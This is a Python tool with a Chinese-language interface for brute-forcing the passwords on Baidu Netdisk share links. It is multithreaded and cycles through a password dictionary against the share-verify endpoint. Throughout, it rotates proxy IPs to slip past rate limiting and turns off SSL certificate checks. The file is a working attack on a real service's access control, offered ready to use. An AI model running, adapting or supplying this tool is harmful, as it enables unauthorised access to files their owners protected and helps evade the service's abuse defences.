import urllib,threading,ssl,time,random,http.cookiejar
ssl._create_default_https_context=ssl._create_unverified_context

password=""
pwddict=[]
totpwd=0
srctot=0
proxy = {'https':''}
def loaddict():
    ignorelist={}
    fp = open(pwdfile, "r")
    for line in fp:
        ignorelist[line.strip('\n')]=0
    fp.close()
    if ignorepwdfile:
        fp = open(ignorepwdfile, "r")
        for line in fp:
            ignorelist[line.strip('\n')]=1
        fp.close()
    for i in ignorelist:
        if ignorelist[i]==0:
            pwddict.append(i)
    
print("==============================================================")
print("百度网盘分享文件密码破解器 by MXWXZ   最后测试于2018年5月9日)")
url=input("请输入URL地址（https://pan.baidu.com/share/init?xxx）：")
url=url.replace("https://pan.baidu.com/share/init?","")
pwdfile=input("请输入当前目录下破解字典文件名（留空默认allpwd.dic）：")
if pwdfile == "":
    pwdfile = "allpwd.dic"
ignorepwdfile=input("请输入当前目录下忽略密码文件名（留空则不使用）：")
delay=input("请输入延时毫秒数：")
threadnum=input("请输入线程数：")
proxyfile=input("请输入代理IP文件名（留空则不使用）：")
proxyurl=input("请输入代理IPAPI地址（留空则不使用）：")
proxylife=input("请输入切换IP频率（秒数）：")
print("==============================================================")
loaddict()
srctot=totpwd=len(pwddict)
print("密码总数：",totpwd)
input("按回车键继续……")
print("==============================================================")

pwdlock = threading.Lock()
def GetPwd():
    if pwdlock.acquire(True):
        global totpwd
        if totpwd == 0:
            return ""
        num=random.randint(0,totpwd-1)
        ret=pwddict[num]
        del pwddict[num]
        totpwd-=1
        pwdlock.release()
        return ret

def RecyclePwd(pwd):
    if pwdlock.acquire(True):
        global totpwd
        pwddict.append(pwd)
        totpwd+=1
        pwdlock.release()
        return

proxylist=[]
def GetProxy():
    global proxylist
    if proxyurl != "":
        while(1):
            try:
                response = urllib.request.urlopen(proxyurl,timeout=5)
                data=response.read().decode()
                if data.find("快") != -1 or data.find("频繁") != -1 or data.find("重试") != -1:
                    time.sleep(20)
                    continue
                proxylist=data.splitlines()
                break
            except:
                time.sleep(20)
    elif proxyfile != "":
        fp = open(proxyfile, "r")
        for line in fp:
            proxylist.append(line.strip('\n'))
        fp.close()

totproxy=0

def CheckThread():
    global proxy,proxylist,totproxy
    cnt=0
    lastpwd=totpwd
    while password == "":
        if totpwd == lastpwd:
            cnt+=1
        else:
            cnt=0
            lastpwd=totpwd
        time.sleep(1)
        if cnt>=30:
            if totproxy == 0:
                GetProxy()
                totproxy=len(proxylist)
            print("[ERROR] 代理服务器",proxy['https'],"未响应！切换至",proxylist[0])
            proxy['https']=proxylist[0]
            del proxylist[0]
            totproxy-=1
            if proxy['https'].count('.') == 3 and proxy['https'].count(':') == 1:
                cnt=0


def ProxyThread():
    global proxy,proxylist,totproxy
    threading.Thread(target = CheckThread, args=()).start()
    while password == "":
        GetProxy()
        totproxy=len(proxylist)
        while totproxy >0 :
            proxy['https']=proxylist[0]
            del proxylist[0]
            totproxy-=1
            if proxy['https'].count('.') != 3 or proxy['https'].count(':') != 1:
                continue
            time.sleep(int(proxylife))

filelock = threading.Lock()
def fuck():
    global password
    headers={"Referer":"https://pan.baidu.com/share/init?" + url,'Content-Length':'26'}
    tot=0
    while password == "":
        time.sleep(int(delay)/1000)
        trying=GetPwd()
        if trying == "":
            break
        while tot%3==0:
            cookie = http.cookiejar.MozillaCookieJar("cookie.txt")
            handler = urllib.request.HTTPCookieProcessor(cookie)
            if proxy['https'] != "":
                proxy_handler = urllib.request.ProxyHandler(proxy)
                opener = urllib.request.build_opener(handler,proxy_handler)
            else:
                opener = urllib.request.build_opener(handler)
            try:
                request = urllib.request.Request("https://pan.baidu.com/share/init?"+url)
                response = opener.open(request,timeout=5)
                break
            except:
                time.sleep(3)
        posturl="https://pan.baidu.com/share/verify?" + url + "&t=" + str(round(time.time() * 1000)) + "&bdstoken=null&channel=chunlei&clienttype=0&web=1&app_id=123456&logid=MTUwMTEyNDM2OTY5MzAuOTE5NTU5NjQwMTk0NDM0OA=="
        data = {"pwd":trying,"vcode":"","vcode_str":""}
        while(1):
            try:
                request = urllib.request.Request(posturl, headers=headers, data=urllib.parse.urlencode(data).encode())
                response = opener.open(request,timeout=5)
                break
            except:
                time.sleep(3)
        check=response.read().decode()
        if check.find(r'"errno":-9') != -1:
            if filelock.acquire(True):
                fp = open("log.dic", "a")
                if fp.tell()!=0:
                    fp.write("\n")
                fp.write(trying)
                fp.close()
                filelock.release()
        elif check.find(r'"errno":0') != -1:
            password=trying
            break
        else:
            RecyclePwd(trying)
        tot+=1

threadid=[]
if proxyfile != "" or proxyurl != "":
    threading.Thread(target = ProxyThread, args=()).start()
for i in range(int(threadnum)):
    threadid.append(threading.Thread(target = fuck, args=()))
    threadid[i].start()
last=totpwd
while 1:
    alive=0
    for i in range(int(threadnum)):
        if threadid[i].isAlive()=="True":
            alive=1
            break
    if password == "":
        print("%.2f%s"%((srctot-totpwd)*100/srctot,'%')," %d/s "%((last-totpwd)/3)," %d seconds last        "%(totpwd/((last-totpwd)/3) if (last-totpwd)/3!=0 else 999999999),end='\r')
        last=totpwd
        if totpwd == 0 and alive == 0:
            print("囧……密码未找到……")
            input("按回车键退出……")
            break
    else:
        print("%.2f%s"%(100,'%')," %d/s "%((last-totpwd)/3)," 0 seconds last        ")
        print("密码已找到！Password:",password)
        fp = open("password.ans", "a")
        fp.write(password)
        fp.close()
        input("按回车键退出……")
        break
    time.sleep(1)